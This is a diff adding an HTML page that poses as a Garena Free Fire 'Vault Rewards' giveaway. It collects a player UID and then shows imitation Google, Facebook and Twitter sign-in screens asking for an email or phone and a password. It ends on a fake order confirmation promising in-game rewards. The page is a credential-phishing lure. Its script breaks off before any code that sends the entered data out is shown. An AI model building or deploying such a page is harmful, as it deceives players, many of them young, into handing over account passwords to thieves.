@@ -1,0 +1,1276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="theme-color" content="#080b12">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="description" content="Garena Free Fire - Exclusive Vault Rewards">
+    <title>Garena Free Fire | Vault Rewards</title>
+    
+    <style>
+        /* ==========================================================================
+           1. CORE CSS VARIABLES & GLOBAL RESET
+           ========================================================================== */
+        @import url('https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Orbitron:wght@700;900&family=Roboto:wght@400;500;700&display=swap');
+
+        :root {
+            --primary-bg: #080b12;
+            --secondary-bg: #111827;
+            --tertiary-bg: #1f2937;
+            --text-primary: #f9fafb;
+            --text-secondary: #9ca3af;
+            --text-muted: #6b7280;
+            --accent-gold: #fbbf24;
+            --accent-gold-dark: #b45309;
+            --accent-blue: #3b82f6;
+            --accent-blue-glow: rgba(59, 130, 246, 0.4);
+            --accent-red: #ef4444;
+            --accent-green: #10b981;
+            --border-color: #374151;
+            --shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
+            --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
+            --shadow-glow: 0 0 15px var(--accent-blue-glow);
+            --font-main: 'Rajdhani', sans-serif;
+            --font-display: 'Orbitron', sans-serif;
+            --font-oauth: 'Roboto', sans-serif;
+        }
+
+        *, *::before, *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+            -webkit-touch-callout: none;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        html {
+            height: 100%;
+            width: 100%;
+            font-size: 16px;
+            scroll-behavior: smooth;
+            background-color: var(--primary-bg);
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            width: 100%;
+            font-family: var(--font-main);
+            background-color: var(--primary-bg);
+            color: var(--text-primary);
+            overflow-x: hidden;
+            position: relative;
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(59, 130, 246, 0.15) 0%, transparent 40%),
+                radial-gradient(circle at 90% 80%, rgba(251, 191, 36, 0.1) 0%, transparent 40%);
+            background-attachment: fixed;
+        }
+
+        /* ==========================================================================
+           2. BACKGROUND EFFECTS (PARTICLES, SCANLINES, AURORA)
+           ========================================================================== */
+        #particles-js {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        .bg-particle {
+            position: absolute;
+            background: var(--accent-blue);
+            border-radius: 50%;
+            opacity: 0.2;
+            animation: floatParticle 10s infinite linear;
+            box-shadow: 0 0 10px var(--accent-blue);
+        }
+
+        @keyframes floatParticle {
+            0% { transform: translateY(100vh) scale(0.5); opacity: 0; }
+            20% { opacity: 0.3; }
+            80% { opacity: 0.3; }
+            100% { transform: translateY(-10vh) scale(1.2); opacity: 0; }
+        }
+
+        .scanline-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                to bottom,
+                rgba(255,255,255,0),
+                rgba(255,255,255,0) 50%,
+                rgba(0,0,0,0.1) 50%,
+                rgba(0,0,0,0.1)
+            );
+            background-size: 100% 4px;
+            z-index: 9999;
+            pointer-events: none;
+            opacity: 0.3;
+        }
+
+        .aurora-bg {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            z-index: -1;
+            background: 
+                linear-gradient(45deg, #0f172a, #1e1b4b, #0f172a);
+            background-size: 400% 400%;
+            animation: aurora 15s ease infinite;
+            opacity: 0.5;
+        }
+
+        @keyframes aurora {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        /* ==========================================================================
+           3. MAIN LAYOUT CONTAINER
+           ========================================================================== */
+        .app-wrapper {
+            position: relative;
+            z-index: 10;
+            max-width: 540px;
+            margin: 0 auto;
+            background: rgba(8, 11, 18, 0.85);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            min-height: 100vh;
+            border-left: 1px solid rgba(255, 255, 255, 0.05);
+            border-right: 1px solid rgba(255, 255, 255, 0.05);
+            box-shadow: 0 0 50px rgba(0,0,0,0.6);
+            display: flex;
+            flex-direction: column;
+            padding-bottom: 60px;
+        }
+
+        /* ==========================================================================
+           4. TOP HEADER
+           ========================================================================== */
+        .app-header {
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 20px;
+            background: rgba(17, 24, 39, 0.95);
+            border-bottom: 1px solid rgba(59, 130, 246, 0.3);
+            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
+        }
+
+        .header-brand {
+            font-family: var(--font-display);
+            font-size: 22px;
+            font-weight: 900;
+            letter-spacing: 2px;
+            display: flex;
+            align-items: center;
+        }
+
+        .header-brand .brand-ff {
+            color: var(--text-primary);
+            text-shadow: 0 0 10px rgba(255,255,255,0.5);
+        }
+
+        .header-brand .brand-vault {
+            color: var(--accent-gold);
+            margin-left: 5px;
+            text-shadow: 0 0 10px rgba(251, 191, 36, 0.5);
+        }
+
+        .header-status {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(16, 185, 129, 0.1);
+            padding: 6px 12px;
+            border-radius: 20px;
+            border: 1px solid rgba(16, 185, 129, 0.3);
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            background-color: var(--accent-green);
+            border-radius: 50%;
+            box-shadow: 0 0 8px var(--accent-green);
+            animation: ping 1.5s infinite;
+        }
+
+        @keyframes ping {
+            0% { transform: scale(0.9); opacity: 1; }
+            50% { transform: scale(1.2); opacity: 0.6; }
+            100% { transform: scale(0.9); opacity: 1; }
+        }
+
+        .status-text {
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--accent-green);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        /* ==========================================================================
+           5. HERO BANNER
+           ========================================================================== */
+        .hero-banner {
+            position: relative;
+            width: 100%;
+            height: 200px;
+            background: linear-gradient(135deg, #1e1b4b 0%, #0f172a 50%, #1e1b4b 100%);
+            border-bottom: 2px solid var(--accent-gold);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            box-shadow: inset 0 -20px 30px rgba(0,0,0,0.8);
+        }
+
+        .hero-pattern {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('data:image/svg+xml;utf8,<svg width="40" height="40" viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg"><path d="M20 0L40 20L20 40L0 20L20 0Z" fill="none" stroke="rgba(255,255,255,0.03)" stroke-width="1"/></svg>');
+            background-size: 40px 40px;
+            opacity: 0.8;
+            animation: movePattern 30s linear infinite;
+        }
+
+        @keyframes movePattern {
+            100% { background-position: 400px 400px; }
+        }
+
+        .hero-glow-left {
+            position: absolute;
+            top: -50px;
+            left: -50px;
+            width: 200px;
+            height: 200px;
+            background: radial-gradient(circle, rgba(239,68,68,0.3) 0%, transparent 70%);
+            filter: blur(20px);
+        }
+
+        .hero-glow-right {
+            position: absolute;
+            bottom: -50px;
+            right: -50px;
+            width: 200px;
+            height: 200px;
+            background: radial-gradient(circle, rgba(59,130,246,0.3) 0%, transparent 70%);
+            filter: blur(20px);
+        }
+
+        .hero-tags {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+            z-index: 2;
+        }
+
+        .hero-tag {
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            padding: 4px 12px;
+            border-radius: 20px;
+            border: 1px solid currentColor;
+            background: rgba(0,0,0,0.3);
+            backdrop-filter: blur(4px);
+        }
+
+        .tag-cobra { color: #ef4444; text-shadow: 0 0 5px #ef4444; }
+        .tag-scorpion { color: #fbbf24; text-shadow: 0 0 5px #fbbf24; }
+        .tag-majestic { color: #3b82f6; text-shadow: 0 0 5px #3b82f6; }
+        .tag-pop { color: #10b981; text-shadow: 0 0 5px #10b981; }
+
+        .hero-title {
+            font-family: var(--font-display);
+            font-size: 48px;
+            font-weight: 900;
+            font-style: italic;
+            letter-spacing: 8px;
+            z-index: 2;
+            background: linear-gradient(to bottom, #ffffff 0%, #fbbf24 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.8)) drop-shadow(0 0 20px rgba(251, 191, 36, 0.3));
+            margin: 0;
+        }
+
+        /* ==========================================================================
+           6. VIEW MANAGEMENT (SPA ROUTING)
+           ========================================================================== */
+        .view {
+            display: none;
+            animation: viewFadeIn 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            flex: 1;
+        }
+
+        .view.view-active {
+            display: block;
+        }
+
+        @keyframes viewFadeIn {
+            from { opacity: 0; transform: translateY(15px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* ==========================================================================
+           7. VIEW 1: UID ENTRY
+           ========================================================================== */
+        .uid-container {
+            padding: 40px 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .uid-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: var(--text-secondary);
+            margin-bottom: 25px;
+            text-align: center;
+        }
+
+        .uid-title strong {
+            color: var(--accent-blue);
+        }
+
+        .uid-form {
+            display: flex;
+            gap: 12px;
+            width: 100%;
+            max-width: 380px;
+        }
+
+        .uid-input {
+            flex: 1;
+            padding: 16px 20px;
+            border: none;
+            border-radius: 8px;
+            background: var(--text-primary);
+            color: #111827;
+            font-size: 18px;
+            font-family: var(--font-main);
+            font-weight: 700;
+            outline: none;
+            box-shadow: inset 0 2px 4px rgba(0,0,0,0.1);
+            transition: box-shadow 0.3s ease;
+        }
+
+        .uid-input:focus {
+            box-shadow: 0 0 0 3px var(--accent-blue), 0 0 20px var(--accent-blue-glow);
+        }
+
+        .btn-primary {
+            padding: 0 32px;
+            background: linear-gradient(180deg, #fbbf24 0%, #d97706 100%);
+            border: 1px solid #fcd34d;
+            border-radius: 8px;
+            color: #000;
+            font-size: 18px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-family: var(--font-main);
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(217, 119, 6, 0.4);
+            transition: transform 0.1s ease, box-shadow 0.2s ease;
+        }
+
+        .btn-primary:active {
+            transform: scale(0.96);
+            box-shadow: 0 2px 8px rgba(217, 119, 6, 0.6);
+        }
+
+        /* ==========================================================================
+           8. VIEW 2: OAUTH PROVIDER SELECTOR
+           ========================================================================== */
+        .provider-container {
+            padding: 40px 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background: #ffffff;
+            color: #202124;
+            min-height: calc(100vh - 200px);
+            font-family: var(--font-oauth);
+        }
+
+        .provider-title {
+            font-size: 24px;
+            font-weight: 500;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .provider-subtitle {
+            font-size: 15px;
+            color: #5f6368;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        .provider-list {
+            width: 100%;
+            max-width: 350px;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .provider-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            padding: 14px;
+            border-radius: 8px;
+            border: 1px solid #dadce0;
+            background: #ffffff;
+            color: #3c4043;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s, box-shadow 0.2s;
+            font-family: var(--font-oauth);
+        }
+
+        .provider-btn:hover {
+            background: #f8f9fa;
+            box-shadow: 0 1px 3px rgba(60,64,67,0.3);
+        }
+
+        .provider-btn svg {
+            width: 24px;
+            height: 24px;
+        }
+
+        /* ==========================================================================
+           9. VIEW 3: LOGIN FORM
+           ========================================================================== */
+        .login-wrapper {
+            padding: 40px 25px;
+            background: #ffffff;
+            min-height: calc(100vh - 200px);
+            color: #202124;
+            border-radius: 12px 12px 0 0;
+            font-family: var(--font-oauth);
+        }
+
+        .login-logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .login-logo svg {
+            width: 48px;
+            height: 48px;
+            margin-bottom: 15px;
+        }
+
+        .login-logo h2 {
+            font-size: 24px;
+            font-weight: 500;
+            margin: 0 0 8px 0;
+        }
+
+        .login-logo p {
+            font-size: 15px;
+            color: #5f6368;
+            margin: 0;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            color: #202124;
+            outline: none;
+            transition: border 0.2s ease;
+            font-family: var(--font-oauth);
+        }
+
+        .form-input:focus {
+            border: 2px solid #1a73e8;
+            padding: 15px;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            font-size: 20px;
+            color: #5f6368;
+        }
+
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background: #1a73e8;
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            font-family: var(--font-oauth);
+            transition: background 0.2s ease;
+        }
+
+        .btn-login:active {
+            background: #1557b0;
+        }
+
+        /* ==========================================================================
+           10. VIEW 4: REWARDS GRID
+           ========================================================================== */
+        .rewards-header {
+            background: linear-gradient(90deg, #d97706 0%, #fcd34d 50%, #d97706 100%);
+            background-size: 200% auto;
+            color: #000;
+            font-weight: 800;
+            font-size: 16px;
+            padding: 16px;
+            text-align: center;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            animation: shimmerGold 3s infinite linear;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
+        }
+
+        @keyframes shimmerGold {
+            0% { background-position: 0% center; }
+            100% { background-position: -200% center; }
+        }
+
+        .rewards-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            padding: 20px;
+        }
+
+        .reward-card {
+            background: linear-gradient(180deg, #1f2937 0%, #111827 100%);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.5);
+            cursor: pointer;
+        }
+
+        .reward-card:active {
+            transform: scale(0.96);
+        }
+
+        .reward-visual {
+            height: 100px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            background: radial-gradient(circle, #374151 0%, #111827 80%);
+        }
+
+        .visual-token {
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(135deg, #ef4444, #7f1d1d);
+            transform: rotate(45deg);
+            border: 2px solid #fca5a5;
+            box-shadow: 0 0 20px rgba(239,68,68,0.6);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: pulseRed 2s infinite alternate;
+        }
+
+        .visual-token::after {
+            content: '🐉';
+            transform: rotate(-45deg);
+            font-size: 24px;
+        }
+
+        @keyframes pulseRed {
+            0% { box-shadow: 0 0 15px rgba(239,68,68,0.4); }
+            100% { box-shadow: 0 0 30px rgba(239,68,68,0.9); }
+        }
+
+        .visual-bundle {
+            width: 40px;
+            height: 70px;
+            background: linear-gradient(180deg, #3b82f6 0%, #1e3a8a 100%);
+            border-radius: 12px 12px 4px 4px;
+            position: relative;
+            box-shadow: 0 0 20px rgba(59,130,246,0.5);
+            animation: floatBundle 3s ease-in-out infinite;
+        }
+
+        .visual-bundle::before {
+            content: '';
+            position: absolute;
+            top: -18px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background: #fcd34d;
+            border: 2px solid #fff;
+        }
+
+        @keyframes floatBundle {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        .visual-pass {
+            width: 55px;
+            height: 40px;
+            background: linear-gradient(135deg, #10b981, #064e3b);
+            border-radius: 6px;
+            border: 1px solid #6ee7b7;
+            box-shadow: 0 0 20px rgba(16,185,129,0.5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+        }
+
+        .visual-pass::after { content: '🎟️'; }
+
+        .reward-count {
+            position: absolute;
+            bottom: 8px;
+            right: 8px;
+            background: rgba(0,0,0,0.8);
+            border: 1px solid var(--accent-gold);
+            color: var(--accent-gold);
+            font-size: 10px;
+            font-weight: 800;
+            padding: 2px 6px;
+            border-radius: 4px;
+            z-index: 2;
+        }
+
+        .reward-details {
+            padding: 10px 5px;
+            text-align: center;
+            flex: 1;
+        }
+
+        .reward-name {
+            font-size: 13px;
+            font-weight: 800;
+            color: var(--text-primary);
+            text-transform: uppercase;
+            text-shadow: 0 1px 2px #000;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .reward-type {
+            font-size: 9px;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            margin-top: 3px;
+            letter-spacing: 1px;
+        }
+
+        .btn-collect {
+            background: linear-gradient(180deg, #fbbf24 0%, #d97706 100%);
+            color: #000;
+            border: none;
+            padding: 10px;
+            font-weight: 800;
+            font-size: 13px;
+            text-transform: uppercase;
+            font-family: var(--font-main);
+            cursor: pointer;
+            transition: background 0.2s ease;
+            box-shadow: 0 -2px 10px rgba(0,0,0,0.5);
+            position: relative;
+            z-index: 2;
+        }
+
+        .btn-collect:active {
+            background: #b45309;
+        }
+
+        /* ==========================================================================
+           11. VIEW 5: PENDING STATE
+           ========================================================================== */
+        .pending-wrapper {
+            padding: 60px 25px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            min-height: calc(100vh - 200px);
+        }
+
+        .pending-icon {
+            font-size: 70px;
+            margin-bottom: 25px;
+            animation: pulsePing 2s infinite;
+        }
+
+        .pending-title {
+            font-family: var(--font-display);
+            color: var(--accent-gold);
+            font-size: 26px;
+            margin-bottom: 15px;
+            text-shadow: 0 0 15px rgba(251, 191, 36, 0.4);
+        }
+
+        .pending-desc {
+            color: var(--text-secondary);
+            font-size: 16px;
+            line-height: 1.6;
+            margin-bottom: 35px;
+            max-width: 320px;
+        }
+
+        .order-details {
+            background: rgba(0,0,0,0.6);
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            padding: 20px;
+            width: 100%;
+            max-width: 340px;
+            margin-bottom: 35px;
+            box-shadow: inset 0 2px 10px rgba(0,0,0,0.5);
+        }
+
+        .order-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+        }
+
+        .order-row:last-child {
+            border-bottom: none;
+        }
+
+        .order-label { color: var(--text-muted); }
+        .order-value { color: var(--text-primary); font-weight: 700; }
+        .order-status { color: var(--accent-gold); font-weight: 700; text-transform: uppercase; letter-spacing: 1px; }
+
+        /* ==========================================================================
+           12. MODALS
+           ========================================================================== */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(8px);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-overlay.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background: linear-gradient(135deg, #1f2937 0%, #111827 100%);
+            padding: 30px;
+            border-radius: 16px;
+            text-align: center;
+            width: 85%;
+            max-width: 340px;
+            border: 2px solid var(--accent-blue);
+            box-shadow: 0 0 40px var(--accent-blue-glow);
+            transform: scale(0.9);
+            transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        .modal-overlay.active .modal-content {
+            transform: scale(1);
+        }
+
+        .modal-icon {
+            font-size: 50px;
+            margin-bottom: 15px;
+        }
+
+        .modal-title {
+            font-size: 22px;
+            font-weight: 800;
+            color: #fff;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            font-family: var(--font-display);
+        }
+
+        .modal-text {
+            font-size: 15px;
+            color: var(--text-secondary);
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        .modal-btn {
+            padding: 14px;
+            background: linear-gradient(180deg, #3b82f6 0%, #2563eb 100%);
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 700;
+            width: 100%;
+            cursor: pointer;
+            text-transform: uppercase;
+            font-family: var(--font-main);
+            box-shadow: 0 4px 15px rgba(37,99,235,0.4);
+        }
+
+        /* ==========================================================================
+           13. RESPONSIVE DESIGN
+           ========================================================================== */
+        @media (max-width: 380px) {
+            .hero-title { font-size: 38px; }
+            .rewards-grid { gap: 8px; padding: 12px; }
+            .reward-name { font-size: 11px; }
+            .btn-collect { font-size: 11px; padding: 8px; }
+            .uid-form { flex-direction: column; }
+            .btn-primary { padding: 16px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- BACKGROUND EFFECTS -->
+    <div class="aurora-bg"></div>
+    <div id="particles-js"></div>
+    <div class="scanline-overlay"></div>
+
+    <!-- MAIN APP CONTAINER -->
+    <div class="app-wrapper">
+
+        <!-- HEADER -->
+        <header class="app-header">
+            <div class="header-brand">
+                <span class="brand-ff">FREE</span>
+                <span class="brand-vault">VAULT</span>
+            </div>
+            <div class="header-status">
+                <div class="status-dot"></div>
+                <span class="status-text">Asia (24ms)</span>
+            </div>
+        </header>
+
+        <!-- HERO BANNER -->
+        <section class="hero-banner">
+            <div class="hero-pattern"></div>
+            <div class="hero-glow-left"></div>
+            <div class="hero-glow-right"></div>
+            <div class="hero-tags">
+                <span class="hero-tag tag-cobra">COBRA</span>
+                <span class="hero-tag tag-scorpion">SCORPION</span>
+                <span class="hero-tag tag-majestic">MAJESTIC</span>
+                <span class="hero-tag tag-pop">POP BLASTER</span>
+            </div>
+            <h1 class="hero-title">VAULT</h1>
+        </section>
+
+        <!-- VIEW 1: UID ENTRY -->
+        <div class="view view-active" id="view-uid">
+            <div class="uid-container">
+                <p class="uid-title">Enter your Free Fire UID to check <strong>Reward Eligibility</strong></p>
+                <div class="uid-form">
+                    <input type="text" id="uid-input" class="uid-input" placeholder="Enter UID" maxlength="12" inputmode="numeric" autocomplete="off">
+                    <button class="btn-primary" onclick="handleUidSubmit()">GO</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- VIEW 2: OAUTH PROVIDER SELECTOR -->
+        <div class="view" id="view-provider">
+            <div class="provider-container">
+                <h2 class="provider-title">Choose an account</h2>
+                <p class="provider-subtitle">to continue to Free Fire Vault</p>
+                
+                <div class="provider-list">
+                    <!-- Google -->
+                    <button class="provider-btn" onclick="selectProvider('Google')">
+                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
+                        Continue with Google
+                    </button>
+
+                    <!-- Facebook -->
+                    <button class="provider-btn" onclick="selectProvider('Facebook')">
+                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill="#1877F2" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.469h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.469h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+                        Continue with Facebook
+                    </button>
+
+                    <!-- Twitter -->
+                    <button class="provider-btn" onclick="selectProvider('Twitter')">
+                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill="#1DA1F2" d="M23.953 4.57a10 10 0 01-2.825.775 4.958 4.958 0 002.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 00-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 00-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 01-2.228-.616v.06a4.923 4.923 0 003.946 4.827 4.996 4.996 0 01-2.212.085 4.936 4.936 0 004.604 3.417 9.867 9.867 0 01-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 007.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0024 4.59z"/></svg>
+                        Continue with Twitter
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- VIEW 3: LOGIN FORM -->
+        <div class="view" id="view-login">
+            <div class="login-wrapper">
+                <div class="login-logo" id="login-logo-container">
+                    <!-- Logo SVG injected via JS -->
+                    <h2 id="login-title">Sign in</h2>
+                    <p id="login-subtitle">to continue to Free Fire Vault</p>
+                </div>
+                <form onsubmit="event.preventDefault(); handleLoginSubmit();">
+                    <div class="form-group">
+                        <input type="text" id="login-email" class="form-input" placeholder="Email or phone" required autocomplete="username">
+                    </div>
+                    <div class="form-group">
+                        <input type="password" id="login-pass" class="form-input" placeholder="Enter your password" required autocomplete="current-password">
+                        <span class="password-toggle" onclick="togglePasswordVisibility()">👁️</span>
+                    </div>
+                    <button type="submit" class="btn-login" id="btn-login">Next</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- VIEW 4: REWARDS -->
+        <div class="view" id="view-rewards">
+            <div class="rewards-header">CLAIM AND GET YOUR EXCLUSIVE REWARD NOW</div>
+            <div class="rewards-grid" id="rewards-grid">
+                <!-- JS will inject cards here -->
+            </div>
+        </div>
+
+        <!-- VIEW 5: PENDING -->
+        <div class="view" id="view-pending">
+            <div class="pending-wrapper">
+                <div class="pending-icon">⏳</div>
+                <h2 class="pending-title">Order Processed</h2>
+                <p class="pending-desc">Your reward request has been successfully submitted to the Garena server.</p>
+                
+                <div class="order-details">
+                    <div class="order-row">
+                        <span class="order-label">Order ID</span>
+                        <span class="order-value" id="order-id">#FF-847291</span>
+                    </div>
+                    <div class="order-row">
+                        <span class="order-label">Account UID</span>
+                        <span class="order-value" id="order-uid">---</span>
+                    </div>
+                    <div class="order-row">
+                        <span class="order-label">Status</span>
+                        <span class="order-value order-status">Processing</span>
+                    </div>
+                </div>
+
+                <p class="pending-desc" style="font-size: 14px;">Rewards will be received in your in-game mailbox within <strong>24-48 hours</strong>. Please do not close this session.</p>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- MODAL -->
+    <div class="modal-overlay" id="modal">
+        <div class="modal-content">
+            <div class="modal-icon" id="modal-icon">⚠️</div>
+            <h3 class="modal-title" id="modal-title">Notice</h3>
+            <p class="modal-text" id="modal-text"></p>
+            <button class="modal-btn" onclick="closeModal()">OK</button>
+        </div>
+    </div>
+
+    <!-- ==========================================================================
+         JAVASCRIPT LOGIC
+         ========================================================================== -->
+    <script>
+        // ==========================================
+        // 1. INITIALIZATION & BACKGROUND
+        // ==========================================
+        function initParticles() {
+            const container = document.getElementById('particles-js');
+            const particleCount = 40;
+            for (let i = 0; i < particleCount; i++) {
+                const p = document.createElement('div');
+                p.classList.add('bg-particle');
+                const size = Math.random() * 4 + 1;
+                p.style.width = `${size}px`;
+                p.style.height = `${size}px`;
+                p.style.left = `${Math.random() * 100}vw`;
+                p.style.animationDuration = `${Math.random() * 10 + 5}s`;
+                p.style.animationDelay = `${Math.random() * 5}s`;
+                container.appendChild(p);
+            }
+        }
+        initParticles();
+
+        // ==========================================
+        // 2. STATE MANAGEMENT
+        // ==========================================
+        const appState = {
+            currentUid: '',
+            currentDevice: {},
+            orderId: '',
+            provider: 'Google'
+        };
+
+        // SVG Logos
+        const logos = {
